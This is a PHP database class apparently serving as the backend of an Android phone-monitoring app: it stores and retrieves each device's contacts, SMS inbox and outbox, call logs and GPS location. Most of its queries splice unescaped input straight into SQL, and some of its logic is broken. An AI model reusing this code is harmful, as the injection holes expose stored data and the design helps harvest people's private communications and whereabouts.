<?php

class DB_Functions {

	private $db;
	
	// constructor

	function __construct() {
		require_once 'config.php';
		
		// connecting to mysql
		try {
			$this->db = new PDO('mysql:host=localhost;dbname=YOURGCMDATABASENAME', DB_USER, DB_PASSWORD);
		}
		catch (PDOException $e) {
			$output = 'Unable to connect to database server.' .
			$e->getMessage();
			exit();
		}
	}

// destructor

function __destruct() {
	
}

	public function storeUser($name, $email, $gcm_regid) {
	//insert user into database
	
	if ($this->accountEmailExists($email)) { 
	try {
		$sql = "INSERT INTO gcm_users(name, email, gcm_regid, created_at) VALUES('$name', '$email', '$gcm_regid', NOW())";
		$result = $this->db->query($sql);

		if ($result) {
			// get user details
			$id = $this->db->lastInsertId(); //last inserted id
			$sql = "SELECT * FROM gcm_users WHERE id = $id";
			$result = $this->db->query($sql);
			$no_of_rows = $result->fetchColumn();
			// return user details
			if ($no_of_rows > 0) {
				return $result->fetch(PDO::FETCH_ASSOC);
			} 
			else {
				return false;
			}
		}
 		else {
			return false;
 		}
	}
	catch (PDOException $e) {
		$error = 'Error storing user: ' . $e->getMessage();
		}
	}
  }

	//Get user by email or password
	public function getUserByEmail($email) {

	try {
		$sql = "SELECT * FROM gcm_users WHERE email = '$email'";
		$result = $this->db->query($sql);
		return $result;
		}
		catch (PDOException $e) {
			$error = 'Error fetching user by email: ' . $e->getMessage();
		}
	}

	//Returns all users
	public function getAllUsers() {

	try {
			
		$sql = "select * FROM gcm_users";
		$result = $this->db->query($sql);
		return $result;
		}

		catch (PDOException $e) {
			$error = 'Error getting all users: ' . $e->getMessage();
		}
	}

	//Check if user exists
	public function isUserExisted($email) {

		try {

			$sql = "SELECT email from gcm_users WHERE email = '$email'";
			$result = $this->db->query($sql);
			$no_of_rows = $result->fetchColumn();

		if ($no_of_rows > 0) {
			// user exists
			return true;
		} 
        else {
			// user doesn't exist
			return false;
	   }
	}

		catch (PDOException $e) {
			$error = 'Error fetching user by email: ' . $e->getMessage();
		}
	}

	//Insert Contacts into DB 
	public function insertContacts($regId, $contacttext) {
			
		try {
			$sql = "UPDATE gcm_users SET contacts = :ctext WHERE gcm_regid = '$regId'";
			$s = $this->db->prepare($sql);
			$s->bindParam(':ctext', $contacttext);
			$s->execute();

		}

		catch (PDOException $e) {
			$output = 'Error performing update: ' . $e->getMessage();
		}
	}

	//Insert sent SMS Data into DB
	public function insertSMS($regId, $smsdata) {

		try {
			$sql = "UPDATE gcm_users SET smsdata = :smstext WHERE gcm_regid = '$regId'";
			$s = $this->db->prepare($sql);
			$s->bindParam(':smstext', $smsdata);
			$s->execute();
		}


	catch (PDOException $e) {
			$output = 'Error performing update: ' . $e->getMessage();
		}
	}

	//Insert sent SMS Outbox Data into DB
	public function insertSentSMS($regId, $smssentdata) {

		try {
			$sql = "UPDATE gcm_users SET smssentdata = :smsstext WHERE gcm_regid = '$regId'";
			$s = $this->db->prepare($sql);
			$s->bindParam(':smsstext', $smssentdata);
			$s->execute();
		}
		
		catch (PDOException $e) {
			$output = 'Error performing update: ' . $e->getMessage();
		}
	}

	//Insert Call Logs into DB
	public function insertCallLogs($regId, $logData) {

		try {
			$sql = "UPDATE gcm_users SET calllogs = :logtext WHERE gcm_regid = '$regId'";
			$s = $this->db->prepare($sql);
			$s->bindParam(':logtext', $logData);
			$s->execute();	
		}

		catch (PDOException $e) {
			$output = 'Error performing update: ' . $e->getMessage();
		}
	}

	//insert latitude and longitude into DB
	public function insertLocation($regId, $latitude, $longitude) {

		try {
			$sql1 = "UPDATE gcm_users SET latitude = :lat WHERE gcm_regid = '$regId'";
			$s = $this->db->prepare($sql1);
			$s->bindParam(':lat', $latitude);
			$s->execute();
			$sql2 = "UPDATE gcm_users SET longitude = :long WHERE gcm_regid = '$regId'";
			$s = $this->db->prepare($sql2);
			$s->bindParam(':long', $longitude);
			$s->execute();
	}

		catch (PDOException $e) {
			$output = 'Error performing update: ' . $e->getMessage();
		}
	}

	//Get all contacts from DB
	public function getContacts($regId) {

		try {
			$sql = "SELECT contacts FROM gcm_users WHERE gcm_regid = '$regId'";
			$resource = $this->db->query($sql);     
			$resultArray = $resource->fetch(PDO::FETCH_ASSOC);
			$result = $resultArray['contacts'];
		}

		catch (PDOException $e) {
			$output = 'Error fetching contacts: ' . $e->getMessage();
		}
		return $result;
	}

	//Get all SMS Inbound messages from DB
	public function getSMSInbox($regId) {

		try {
			$sql = "SELECT smsdata FROM gcm_users WHERE gcm_regid = '$regId'";
			$resource = $this->db->query($sql); 
			$resultArray = $resource->fetch(PDO::FETCH_ASSOC);
			$result = $resultArray['smsdata'];
		}
		
		catch (PDOException $e) {
			$output = 'Error fetching sms data: ' . $e->getMessage();
		}
		return $result;
	}

	//Get all SMS Outbound messages from DB
	public function getSMSSent($regId) {

		try {
			$sql = "SELECT smssentdata FROM gcm_users WHERE gcm_regid = '$regId'";
			$resource = $this->db->query($sql);     
			$resultArray = $resource->fetch(PDO::FETCH_ASSOC);
			$result = $resultArray['smssentdata'];
	}
		catch (PDOException $e) {
			$output = 'Error fetching sms outbox: ' . $e->getMessage();
		}
		return $result;
	}

	//Get CallLogs from DB
	public function getCallLogs($regId) {

		try {
			$sql = "SELECT calllogs FROM gcm_users WHERE gcm_regid = '$regId'";
			$resource = $this->db->query($sql);   
			$resultArray = $resource->fetch(PDO::FETCH_ASSOC);
			$result = $resultArray['calllogs'];
		}
		
		catch (PDOException $e) {
			$output = 'Error fetching logs: ' . $e->getMessage();
		}
		return $result;
		}


	//Get latitude from DB
	public function getLat($regId) {
			
		try {
			$sql = "SELECT latitude FROM gcm_users WHERE gcm_regid = '$regId'";
			$resource = $this->db->query($sql);
			$resultArray = $resource->fetch(PDO::FETCH_ASSOC);
			$result = $resultArray['latitude'];
		}

		catch (PDOException $e) {
				$output = 'Error fetching location: ' . $e->getMessage();
		}
		return $result;
	}

	//Get longitude from DB
	public function getLong($regId) {

		try {
			$sql = "SELECT longitude FROM gcm_users WHERE gcm_regid = '$regId'";
			$resource = $this->db->query($sql);
			$resultArray = $resource->fetch(PDO::FETCH_ASSOC);
			$result = $resultArray['longitude'];
		}

		catch (PDOException $e) {
			$output = 'Error fetching location: ' . $e->getMessage();
			}
		
		return $result;
		}
	
	
	public function deleteDevice($rowId) {
		try {
			$sql = 'DELETE FROM gcm_users WHERE id = :id';
			$s = $this->db->prepare($sql);
			$s->bindParam(':id', $rowId);
			$s->execute();
		}
		catch (PDOException $e) {
		}
		
	}
	

}

?>
